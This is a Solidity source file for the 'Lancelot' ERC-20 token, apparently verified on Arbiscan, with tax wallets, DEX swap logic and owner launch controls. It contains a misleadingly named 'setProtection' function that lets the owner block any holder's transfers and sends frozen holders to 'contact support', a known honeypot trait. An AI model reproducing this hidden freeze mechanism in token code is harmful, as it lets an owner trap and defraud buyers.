/**
 *Submitted for verification at Arbiscan on 2023-03-01
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if(currentAllowance != type(uint256).max) { 
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Lancelot is ERC20, Ownable {
    IDexRouter public dexRouter;
    address public lpPair;

    uint8 constant _decimals = 9;
    uint256 constant _decimalFactor = 10 ** _decimals;

    bool private swapping;

    uint256 public swapTokensAtAmount;
    bool public swapEnabled = true;

    mapping (address => uint256) protected;

    address public taxAddress1;
    address public taxAddress2;
    address public taxAddress3;
    address public referrer;
    bool public buyTaxEnabled;
    bool public sellTaxEnabled;

    uint256 public tradingActiveTime;

    mapping(address => bool) public _isExcludedFromFees;
    mapping(address => bool) public pairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetPair(address indexed pair, bool indexed value);
    event UpdatedTaxAddress(address indexed newWallet);

    constructor(address tax1, address tax2, address tax3) ERC20("Lancelot", "LANCE") payable {
        require(tax1 != address(0) && tax2 != address(0) && tax3 != address(0), "invalid tax addresses");
        taxAddress1 = tax1;
        taxAddress2 = tax2;
        taxAddress3 = tax3;
        // initialize router
        address routerAddress = 0xc873fEcbd354f5A56E00E710B90EF4201db2448d;
        dexRouter = IDexRouter(routerAddress);

        _approve(msg.sender, routerAddress, type(uint256).max);
        _approve(address(this), routerAddress, type(uint256).max);

        uint256 totalSupply = 37_000_000_000_000 * _decimalFactor;

        excludeFromFees(msg.sender, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        _totalSupply = totalSupply;

        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        swapTokensAtAmount = (totalSupply * 2) / 10000;

        transferOwnership(msg.sender);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function getSellFees() public view returns (uint256) {
        if(!sellTaxEnabled) return 0;
        return 7;
    }

    function getBuyFees() public view returns (uint256) {
        if(!buyTaxEnabled) return 0;
        return 7;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function circulatingSupply() public view returns (uint256) {
        return totalSupply() - balanceOf(address(0xdead));
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (tradingActiveTime == 0) {
            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading not active");
        }
        if (tradingActiveTime > 0 && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            require(protected[from] == 0, "wallet protection enabled, please contact support");
            uint256 fees = 0;
            uint256 _sf = getSellFees();
            uint256 _bf = getBuyFees();

            if (swapEnabled && !swapping && pairs[to]) {
                swapping = true;
                swapBack(amount);
                swapping = false;
            }

            if (pairs[to] &&_sf > 0) {
                fees = (amount * _sf) / 100;
            }
            else if (_bf > 0 && pairs[from]) {
                fees = (amount * _bf) / 100;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            referrer,
            block.timestamp
        );
    }

    function swapBack(uint256 amount) private {
        uint256 amountToSwap = balanceOf(address(this));
        if (amountToSwap < swapTokensAtAmount) return;
        if (amountToSwap > swapTokensAtAmount * 10) amountToSwap = swapTokensAtAmount * 10;
        if (amountToSwap > amount) amountToSwap = 90 * amount / 100;
	    if (amountToSwap == 0) return;

        swapTokensForEth(amountToSwap);

        uint256 ethBalance = address(this).balance;

        uint256 taxAmount1 = ethBalance * 5 / 14;
        uint256 taxAmount2 = ethBalance * 5 / 14;
        uint256 taxAmount3 = ethBalance * 4 / 14;

        bool success;
        if(taxAmount1 > 0)
            (success, ) = taxAddress1.call{value: taxAmount1}("");
        if(taxAmount2 > 0)
            (success, ) = taxAddress2.call{value: taxAmount2}("");
        if(taxAmount3 > 0)
            (success, ) = taxAddress3.call{value: taxAmount3}("");
    }

    function withdrawStuckETH() external {
        bool success;
        (success, ) = address(taxAddress1).call{value: address(this).balance}("");
    }

    function withdrawStuckTokens() external {
        require(!swapEnabled, "Can't withdraw tokens while swap enabled");
        super._transfer(address(this), taxAddress1, balanceOf(address(this)));
    }

    function launchWithLP() external payable onlyOwner {
        require(tradingActiveTime == 0);

        address _lpPair = IDexFactory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
        lpPair = _lpPair;
        IERC20(_lpPair).approve(address(dexRouter), type(uint256).max);

        dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);

        buyTaxEnabled = true;
        sellTaxEnabled = true;
        tradingActiveTime = block.timestamp;
    }

    function manualLaunch(address pair) external onlyOwner {
        require(tradingActiveTime == 0);
        require(pair != address(0), "Requires a pair address");

        lpPair = pair;
        IERC20(pair).approve(address(dexRouter), type(uint256).max);

        buyTaxEnabled = true;
        sellTaxEnabled = true;
        tradingActiveTime = block.timestamp;
    }

    function setPair(address pair, bool value) external onlyOwner {
        if(!value)
            require(pair != lpPair,"The pair cannot be removed from pairs");
        else
            IERC20(pair).approve(address(dexRouter), type(uint256).max);
        require(pair != address(0), "pair address cannot be 0");
        pairs[pair] = value;

        emit SetPair(pair, value);
    }

    function setTaxAddress1(address _taxAddress) external onlyOwner {
        require(_taxAddress != address(0), "pair address cannot be 0");
        taxAddress1 = _taxAddress;
        emit UpdatedTaxAddress(_taxAddress);
    }

    function setTaxAddress2(address _taxAddress) external onlyOwner {
        require(_taxAddress != address(0), "pair address cannot be 0");
        taxAddress2 = _taxAddress;
        emit UpdatedTaxAddress(_taxAddress);
    }

    function setTaxAddress3(address _taxAddress) external onlyOwner {
        require(_taxAddress != address(0), "pair address cannot be 0");
        taxAddress3 = _taxAddress;
        emit UpdatedTaxAddress(_taxAddress);
    }

    function setReferrer(address _ref) external onlyOwner {
        referrer = _ref;
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(newAmount >= (circulatingSupply() * 1) / 100000, "Swap amount cannot be lower than 0.001% total supply.");
        require(newAmount <= (circulatingSupply() * 1) / 1000, "Swap amount cannot be higher than 0.1% total supply.");
        swapTokensAtAmount = newAmount;
    }

    function disableSwap() external onlyOwner {
        swapEnabled = false;
    }

    function enableSwap() external onlyOwner {
        swapEnabled = true;
    }

    function disableBuyTax() external onlyOwner {
        buyTaxEnabled = false;
    }

    function enableBuyTax() external onlyOwner {
        buyTaxEnabled = true;
    }

    function disableSellTax() external onlyOwner {
        sellTaxEnabled = false;
    }

    function enableSellTax() external onlyOwner {
        sellTaxEnabled = true;
    }

    function setProtection(address _wallet) external onlyOwner {
        require(_wallet != lpPair && _wallet != address(dexRouter), "Invalid wallets");
        protected[_wallet] = 1;
    }

    function clearProtection(address _wallet) external onlyOwner {
        protected[_wallet] = 0;
    }

    function airdropToWallets(address[] memory wallets, uint256[] memory amounts) external onlyOwner {
        require(wallets.length == amounts.length, "Arrays must be the same length");

        for (uint256 i = 0; i < wallets.length; i++) {
            super._transfer(msg.sender, wallets[i], amounts[i]);
        }
    }
}